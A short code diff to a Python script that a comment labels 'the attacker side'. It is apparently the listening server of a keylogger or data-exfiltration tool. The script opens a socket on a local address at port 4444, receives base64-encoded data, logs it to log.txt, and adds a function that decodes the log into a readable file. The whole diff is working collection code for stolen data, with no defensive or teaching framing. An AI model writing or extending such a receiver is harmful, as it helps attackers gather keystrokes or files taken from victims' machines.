@@ -6,6 +6,13 @@ host, port = '192.168.1.177', 4444
 
 
 # This class describe the attacker side
+def decode_text():
+    f_log = open('log.txt', 'r')
+    f_decrypt = open('decrypt_log.txt', 'a')
+    for line in f_log:
+        f_decrypt.write(base64cipher.decodeMsg(line))
+
+
 class recv_data:
     mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     mysocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -13,12 +20,12 @@ class recv_data:
 
     def __init__(self):
         data = self.mysocket.recv(1024)
-        f = open('log.txt', 'w')
+        f = open('log.txt', 'wb')
         while data != bytes(''.encode()):
-            data = base64cipher.decodeMsg(data)
             # print(data)
             f.write(data)
             data = self.mysocket.recv(1024)
+        decode_text()
 
 
 re = recv_data()
